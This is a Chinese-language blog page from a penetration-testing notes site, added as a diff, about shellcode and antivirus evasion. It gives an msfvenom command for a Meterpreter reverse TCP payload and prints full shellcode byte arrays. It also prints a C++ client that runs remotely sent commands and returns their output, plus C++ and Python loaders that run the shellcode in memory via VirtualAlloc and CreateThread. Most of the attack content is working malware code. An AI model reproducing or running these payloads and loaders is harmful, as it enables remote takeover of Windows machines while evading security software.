@@ -1,0 +1,185 @@
+<!-- build time:Thu Jan 18 2024 13:01:14 GMT+0800 (China Standard Time) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="余星酒" href="http://example.com/rss.xml"><link rel="alternate" type="application/atom+xml" title="余星酒" href="http://example.com/atom.xml"><link rel="alternate" type="application/json" title="余星酒" href="http://example.com/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="渗透测试,免杀学习"><link rel="canonical" href="http://example.com/APT/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/shellcode/"><title>shellcode - 免杀学习 - 渗透测试 | 余星酒 = 余星酒 = 痴看年少风雨疾，一转本生蹉跎游</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">shellcode</h1><div class="meta"><span class="item" title="创建时间：2023-12-31 14:05:00"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2023-12-31T14:05:00+08:00">2023-12-31</time></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">余星酒</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giciundwu5j20zk0m8n9e.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giciszlczyj20zk0m816d.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipeu7txpzj20zk0m81kx.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicis081o9j20zk0m8dmr.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclflwv2aj20zk0m84qp.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipevarprfj20zk0m8npd.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/APT/" itemprop="item" rel="index" title="分类于 渗透测试"><span itemprop="name">渗透测试</span></a><meta itemprop="position" content="1"></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/APT/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/" itemprop="item" rel="index" title="分类于 免杀学习"><span itemprop="name">免杀学习</span></a><meta itemprop="position" content="2"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://example.com/APT/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/shellcode/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="余星酒"><meta itemprop="description" content="痴看年少风雨疾，一转本生蹉跎游, 欢迎参观我的笔记空间 ~ 这里主要会记录一些安全相关的学习笔记 🌸"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="余星酒"></span><div class="body md" itemprop="articleBody"><h1 id="正向和反向"><a href="#正向和反向" class="headerlink" title="正向和反向"></a>正向和反向</h1><p>正向连接 : 正向连接是控制主机主动去连接受害主机的过程</p><img data-src="/APT/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/shellcode/image-20231231144033864.png"><p>反向连接 : 反向连接是控制主机监听一个端口，由受害主机反向去连接控制主机的过程</p><img data-src="/APT/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/shellcode/image-20231231144104735.png"><pre><code class="shell">msfvenom --list payloads
+
+windows/x64/meterpreter/reverse_winhttp  // 反向
+windows/x64/meterpreter/bind_tcp         // 正向
+</code></pre><h1 id="stage和stageless"><a href="#stage和stageless" class="headerlink" title="stage和stageless"></a>stage和stageless</h1><img data-src="/APT/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/shellcode/image-20231231144033864.png"><p>还是这张图，不论是正向还是反向，已经成功建立连接，之后需要传输命令，这其实是两个过程，一个是建立连接，另一个是传输命令，那么就可以做成两种格式（很大程度能够免杀），一种是一个建立连接的接收器（只负责连接方式和协议），另一种是执行各种命令的执行器，这种格式就是stage</p><p>stageless就是两者结合在一起全部发送过去，免杀效果肯定不如前者</p><p>在msf中区分stage和stageless</p><pre><code class="shell">windows/x64/meterpreter/reverse_tcp // stage格式 
+
+windows/x64/meterpreter_reverse_tcp // stageless格式
+</code></pre><p>在cs中区分stage和stageless</p><img data-src="/APT/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/shellcode/image-20231231151317347.png"><p>其中加s的是stageless，不加s的是stage</p><h1 id="C2"><a href="#C2" class="headerlink" title="C2"></a>C2</h1><ul><li>command &amp; control（命令和控制）</li></ul><img data-src="/APT/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/shellcode/image-20231231144033864.png"><p>继续这张图，当我们已经成功建立连接后，不管是正向（查看流量）还是反向（查看exe）都会查看到攻击者的IP，那么就可以利用一些中间平台来作为一层跳板，就会变成攻击机和c2之间是作为接受命令的通道，c2和被攻击者之间是作为发送控制通道</p><h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><pre><code class="shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.5 LPORT=1234 -f c
+</code></pre><img data-src="/APT/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/shellcode/image-20231231153306605.png"><pre><code class="c">unsigned char buf[] = 
+&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52&quot;
+&quot;\x30\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x31\xff\x8b&quot;
+&quot;\x72\x28\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d&quot;
+&quot;\x01\xc7\x49\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01&quot;
+&quot;\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x48\x18&quot;
+&quot;\x8b\x58\x20\x01\xd3\x85\xc9\x74\x3c\x49\x31\xff\x8b\x34&quot;
+&quot;\x8b\x01\xd6\x31\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75&quot;
+&quot;\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01&quot;
+&quot;\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01&quot;
+&quot;\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58&quot;
+&quot;\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00&quot;
+&quot;\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8&quot;
+&quot;\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80&quot;
+&quot;\x6b\x00\xff\xd5\x6a\x0a\x68\x0a\xd3\x37\x05\x68\x02\x00&quot;
+&quot;\x04\xd2\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;
+&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74&quot;
+&quot;\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67&quot;
+&quot;\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f&quot;
+&quot;\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10&quot;
+&quot;\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53&quot;
+&quot;\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8&quot;
+&quot;\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b&quot;
+&quot;\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e&quot;
+&quot;\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff&quot;
+&quot;\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a&quot;
+&quot;\x00\x53\xff\xd5&quot;;
+</code></pre><p>无文件落地，可以在内存中运行</p><h1 id="加载器和源码"><a href="#加载器和源码" class="headerlink" title="加载器和源码"></a>加载器和源码</h1><p>加载器 : 考虑如何让shellcode运行起来</p><p>通过hash去源码中查找api函数的一个效果</p><p>shellcode实现过程</p><ol><li>去ws2_32.dll中去查找api函数，这个文件中包含的是一些socket编程需要的一些函数</li><li>通过hash找到kernel32.dll调用它的LoadLibraryA函数去加载ws2_32.dll</li><li>初始化wsa（socket）对象</li><li>判断程序初始化情况</li><li>定义连接情况并开始连接<ol><li>使用ipv4连接（AF_INET）</li><li>使用tcp连接（SOCK_STREAM）</li><li>初始化ip（采用小端序写法）和端口</li></ol></li><li>提前申请好需要的内存空间</li><li>写一个循环接受内容</li><li>用jmp把收到的内容转换成可以执行的代码</li></ol><h2 id="C-实现socket"><a href="#C-实现socket" class="headerlink" title="C++实现socket"></a>C++实现socket</h2><pre><code class="c++">#include &lt;WinSock2.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;tchar.h&gt;
+#include &lt;string.h&gt;
+#include &lt;Windows.h&gt;
+#pragma comment(lib, &quot;ws2_32.lib&quot;)
+
+#define _WINSOCK_DEPRECATED_NO_WARNINGS 
+#define SERVER_PORT 12345
+#define BUFF_SIZE 1024
+
+int _tmain(int argc, _TCHAR* argv[]) &#123;
+    WORD wVersionRequested;
+    WSAData wsaData;
+    int err;
+    printf(&quot;this is a client side application!\n&quot;);
+    wVersionRequested = MAKEWORD(2, 2);
+    err = WSAStartup(wVersionRequested, &amp;wsaData);
+    if (err != 0) &#123;
+        printf(&quot;WSAStartup() called failed!\n&quot;);
+        return -1;
+    &#125;else&#123;
+        printf(&quot;WSAStartup called successful!\n&quot;);
+    &#125;
+    if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2) &#123;
+        WSACleanup();
+        return -1;
+    &#125;
+    SOCKET sockClient = socket(AF_INET, SOCK_STREAM, 0);
+    
+    if (sockClient == INVALID_SOCKET) &#123;
+        printf(&quot;socket() called failed! error code is %d\n&quot;, WSAGetLastError());
+        return -1;
+    &#125;
+    else &#123;
+        printf(&quot;socket() called successful!\n&quot;);
+    &#125;
+    SOCKADDR_IN addrServer;
+    #pragma warning(disable: 4996)
+    addrServer.sin_addr.S_un.S_addr = inet_addr(&quot;10.211.55.5&quot;);
+    #pragma warning(default: 4996)
+    addrServer.sin_family = AF_INET;
+    addrServer.sin_port = htons(SERVER_PORT);
+    err = connect(sockClient, (SOCKADDR*)&amp;addrServer, sizeof(SOCKADDR));
+    if (err == SOCKET_ERROR) &#123;
+        printf(&quot;connect() called failed! The error code is %d\n&quot;, WSAGetLastError());
+    &#125;
+    else &#123;
+        printf(&quot;connect() called successful\n&quot;);
+    &#125;
+    while (true) &#123;
+        char recvBuf[BUFF_SIZE] = &#123; 0 &#125;;
+        recv(sockClient, recvBuf, 1024, 0);
+        if (strlen(recvBuf) == 0) &#123;
+            break;
+        &#125;
+        printf(&quot;receive data from server side is : %s\n&quot;, recvBuf);
+        FILE *fp;
+        char buf[255] = &#123; 0 &#125;;
+        if ((fp = _popen(recvBuf, &quot;r&quot;)) == NULL) &#123;
+            perror(&quot;Fail to popen\n&quot;);
+            exit(1);
+        &#125;
+        while (fgets(buf, 255, fp) != NULL) &#123;
+            send(sockClient, buf, strlen(buf) + 1, 0);
+        &#125;
+        _pclose(fp);
+    &#125;
+    closesocket(sockClient);
+    WSACleanup();
+    system(&quot;pause&quot;);
+    return 0;
+&#125;
+</code></pre><p>在此基础上实现屏幕截图，键盘记录</p><p>钉钉机器人实现执行cmd的 给钉钉机器人发送命令，客户端会执行命令并返回</p><p>api函数（）</p><h2 id="C-直接指针加载"><a href="#C-直接指针加载" class="headerlink" title="C++直接指针加载"></a>C++直接指针加载</h2><pre><code class="c++">int main() &#123;
+    ((void(*)(void)) &amp; buf)();
+&#125;
+</code></pre><ol><li><code>((void(*)(void)) &amp; buf)</code>这是一个类型转换表达式，将buf的地址强制转换为一个函数指针类型，该函数没有参数也没有返回值</li><li><code>void(*)(void)</code>其中<code>void(*)</code>的<code>void</code>表示函数没有返回值，<code>(*)</code>表示这是一个指针，结合起来就表示一个指向没有返回值函数的指针，<code>(void)</code>是没有返回值</li><li><code>(void(*)(void))</code>就是告诉编译器，被强制转换的值应该被视为一个指向没有参数和返回值的函数的指针</li><li><code>&amp; buf</code>取<code>buf</code>变量的地址</li><li><code>((void(*)(void)) &amp; buf)</code>表示为将<code>buf</code>转换为函数指针后，通过<code>()</code>运算符进行调用，就是尝试执行存储在buf变量指向的地址处的代码，而buf也就是通过msf生成的shellcode</li></ol><h2 id="python实现加载"><a href="#python实现加载" class="headerlink" title="python实现加载"></a>python实现加载</h2><pre><code class="python">#!/bin/bash 
+import ctypes
+
+buf =  b&quot;&quot;
+buf += b&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52&quot;
+buf += b&quot;\x30\x89\xe5\x8b\x52\x0c\x8b\x52\x14\x31\xff\x0f&quot;
+buf += b&quot;\xb7\x4a\x26\x8b\x72\x28\x31\xc0\xac\x3c\x61\x7c&quot;
+buf += b&quot;\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49\x75\xef\x52&quot;
+buf += b&quot;\x8b\x52\x10\x57\x8b\x42\x3c\x01\xd0\x8b\x40\x78&quot;
+buf += b&quot;\x85\xc0\x74\x4c\x01\xd0\x8b\x58\x20\x50\x8b\x48&quot;
+buf += b&quot;\x18\x01\xd3\x85\xc9\x74\x3c\x49\x31\xff\x8b\x34&quot;
+buf += b&quot;\x8b\x01\xd6\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38&quot;
+buf += b&quot;\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58&quot;
+buf += b&quot;\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c&quot;
+buf += b&quot;\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b&quot;
+buf += b&quot;\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12&quot;
+buf += b&quot;\xe9\x80\xff\xff\xff\x5d\x68\x6e\x65\x74\x00\x68&quot;
+buf += b&quot;\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5&quot;
+buf += b&quot;\x31\xdb\x53\x53\x53\x53\x53\xe8\x73\x00\x00\x00&quot;
+buf += b&quot;\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20&quot;
+buf += b&quot;\x28\x4d\x61\x63\x69\x6e\x74\x6f\x73\x68\x3b\x20&quot;
+buf += b&quot;\x49\x6e\x74\x65\x6c\x20\x4d\x61\x63\x20\x4f\x53&quot;
+buf += b&quot;\x20\x58\x20\x31\x34\x5f\x30\x29\x20\x41\x70\x70&quot;
+buf += b&quot;\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35\x33\x37&quot;
+buf += b&quot;\x2e\x33\x36\x20\x28\x4b\x48\x54\x4d\x4c\x2c\x20&quot;
+buf += b&quot;\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x29\x20&quot;
+buf += b&quot;\x43\x68\x72\x6f\x6d\x65\x2f\x31\x31\x37\x2e\x30&quot;
+buf += b&quot;\x2e\x30\x2e\x30\x20\x53\x61\x66\x61\x72\x69\x2f&quot;
+buf += b&quot;\x35\x33\x37\x2e\x33\x36\x00\x68\x3a\x56\x79\xa7&quot;
+buf += b&quot;\xff\xd5\x53\x53\x6a\x03\x53\x53\x68\xd2\x04\x00&quot;
+buf += b&quot;\x00\xe8\x3e\x01\x00\x00\x2f\x46\x38\x66\x4f\x55&quot;
+buf += b&quot;\x30\x44\x4b\x54\x48\x4b\x38\x49\x72\x30\x6a\x32&quot;
+buf += b&quot;\x62\x41\x55\x5a\x77\x6f\x49\x67\x71\x6b\x47\x34&quot;
+buf += b&quot;\x56\x62\x71\x37\x64\x51\x31\x73\x4c\x6f\x77\x67&quot;
+buf += b&quot;\x63\x48\x45\x65\x6e\x43\x69\x66\x43\x6c\x41\x65&quot;
+buf += b&quot;\x77\x6f\x49\x37\x41\x6a\x69\x79\x46\x68\x74\x32&quot;
+buf += b&quot;\x63\x6f\x67\x43\x6a\x5f\x4f\x41\x55\x47\x49\x35&quot;
+buf += b&quot;\x64\x68\x67\x6b\x59\x6f\x5a\x77\x35\x50\x69\x45&quot;
+buf += b&quot;\x58\x72\x6a\x6e\x4f\x76\x62\x52\x31\x42\x37\x59&quot;
+buf += b&quot;\x65\x49\x74\x62\x5a\x72\x72\x50\x50\x7a\x46\x62&quot;
+buf += b&quot;\x71\x63\x30\x4b\x37\x6a\x72\x5f\x56\x6a\x65\x6f&quot;
+buf += b&quot;\x79\x4f\x6a\x38\x50\x63\x4a\x70\x34\x36\x65\x7a&quot;
+buf += b&quot;\x54\x69\x59\x4e\x4d\x72\x67\x73\x65\x6c\x4b\x79&quot;
+buf += b&quot;\x45\x4f\x42\x4b\x68\x75\x74\x6a\x35\x74\x5f\x30&quot;
+buf += b&quot;\x44\x74\x50\x75\x4e\x4c\x6f\x41\x78\x51\x4a\x4b&quot;
+buf += b&quot;\x74\x78\x57\x45\x5f\x74\x48\x4e\x68\x35\x70\x7a&quot;
+buf += b&quot;\x4a\x4d\x64\x74\x61\x6e\x35\x47\x00\x50\x68\x57&quot;
+buf += b&quot;\x89\x9f\xc6\xff\xd5\x89\xc6\x53\x68\x00\x02\x68&quot;
+buf += b&quot;\x84\x53\x53\x53\x57\x53\x56\x68\xeb\x55\x2e\x3b&quot;
+buf += b&quot;\xff\xd5\x96\x6a\x0a\x5f\x53\x53\x53\x53\x56\x68&quot;
+buf += b&quot;\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x14\x68\x88&quot;
+buf += b&quot;\x13\x00\x00\x68\x44\xf0\x35\xe0\xff\xd5\x4f\x75&quot;
+buf += b&quot;\xe1\xe8\x48\x00\x00\x00\x6a\x40\x68\x00\x10\x00&quot;
+buf += b&quot;\x00\x68\x00\x00\x40\x00\x53\x68\x58\xa4\x53\xe5&quot;
+buf += b&quot;\xff\xd5\x93\x53\x53\x89\xe7\x57\x68\x00\x20\x00&quot;
+buf += b&quot;\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0&quot;
+buf += b&quot;\x74\xcf\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3&quot;
+buf += b&quot;\x5f\xe8\x7f\xff\xff\xff\x31\x30\x2e\x32\x31\x31&quot;
+buf += b&quot;\x2e\x35\x35\x2e\x35\x00\xbb\xf0\xb5\xa2\x56\x6a&quot;
+buf += b&quot;\x00\x53\xff\xd5&quot;
+
+
+# shellcode加载
+def shellCodeLoad(shellcode):
+    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64 # 规定VirtualAlloc的返回值类型
+    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40)) # 创建虚拟内存
+    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode) # 将shellcode的长度和内存存到buf变量中
+    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr), buf, ctypes.c_int(len(shellcode))) # 将buf内存块中的内容复制到刚刚申请的ptr内存中
+    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0))) # 第一个参数为0表示为指向当前程序下的句柄
+    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1)) # 让这个线程永不关闭
+
+if __name__ == &quot;__main__&quot; :
+    shellCodeLoad(bytearray(buf))
+</code></pre><div class="tags"><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"><i class="ic i-tag"></i> 渗透测试</a> <a href="/tags/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/" rel="tag"><i class="ic i-tag"></i> 免杀学习</a></div></div><footer><div class="meta"></div><div class="reward"><button><i class="ic i-heartbeat"></i> 赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img data-src="/images/wechatpay.png" alt="余星酒 微信支付"><p>微信支付</p></div><div><img data-src="/images/alipay.png" alt="余星酒 支付宝"><p>支付宝</p></div><div><img data-src="/images/paypal.png" alt="余星酒 贝宝"><p>贝宝</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>余星酒 <i class="ic i-at"><em>@</em></i>余星酒</li><li class="link"><strong>本文链接：</strong> <a href="http://example.com/APT/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/shellcode/" title="shellcode">http://example.com/APT/免杀学习/shellcode/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giciukx8a7j20zk0m8aio.jpg" title="Tomcat内存马"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> Java安全基础</span><h3>Tomcat内存马</h3></a></div><div class="item right"><a href="/APT/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giciusoyjnj219g0u0x56.jpg" title="未命名"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i></span><h3>未命名</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E5%92%8C%E5%8F%8D%E5%90%91"><span class="toc-number">1.</span> <span class="toc-text">正向和反向</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#stage%E5%92%8Cstageless"><span class="toc-number">2.</span> <span class="toc-text">stage和stageless</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#C2"><span class="toc-number">3.</span> <span class="toc-text">C2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#shellcode"><span class="toc-number">4.</span> <span class="toc-text">shellcode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%92%8C%E6%BA%90%E7%A0%81"><span class="toc-number">5.</span> <span class="toc-text">加载器和源码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#C-%E5%AE%9E%E7%8E%B0socket"><span class="toc-number">5.1.</span> <span class="toc-text">C++实现socket</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C-%E7%9B%B4%E6%8E%A5%E6%8C%87%E9%92%88%E5%8A%A0%E8%BD%BD"><span class="toc-number">5.2.</span> <span class="toc-text">C++直接指针加载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python%E5%AE%9E%E7%8E%B0%E5%8A%A0%E8%BD%BD"><span class="toc-number">5.3.</span> <span class="toc-text">python实现加载</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li class="active"><a href="/APT/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/shellcode/" rel="bookmark" title="shellcode">shellcode</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="余星酒" data-src="/images/avatar.jpg"><p class="name" itemprop="name">余星酒</p><div class="description" itemprop="description">欢迎参观我的笔记空间 ~ 这里主要会记录一些安全相关的学习笔记 🌸</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">253</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">43</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">36</span> <span class="name">标签</span></a></div></nav><div class="social"></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/APT/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"></div><span><a href="/APT/%E9%9D%B6%E5%9C%BAwp/%E9%9D%B6%E5%9C%BA/hachthebox/Visual/" title="Visual">Visual</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/APT/" title="分类于 渗透测试">渗透测试</a> <i class="ic i-angle-right"></i> <a href="/categories/APT/%E9%9D%B6%E5%9C%BA/" title="分类于 靶场">靶场</a></div><span><a href="/APT/%E9%9D%B6%E5%9C%BAwp/%E9%9D%B6%E5%9C%BA/mysql-sqli-labs/mysql-sqli-labs/" title="mysql-sqli-labs">mysql-sqli-labs</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="分类于 网络">网络</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E5%8D%8E%E4%B8%BA%E9%98%B2%E7%81%AB%E5%A2%99/" title="分类于 华为防火墙">华为防火墙</a> <i class="ic i-angle-right"></i> <a 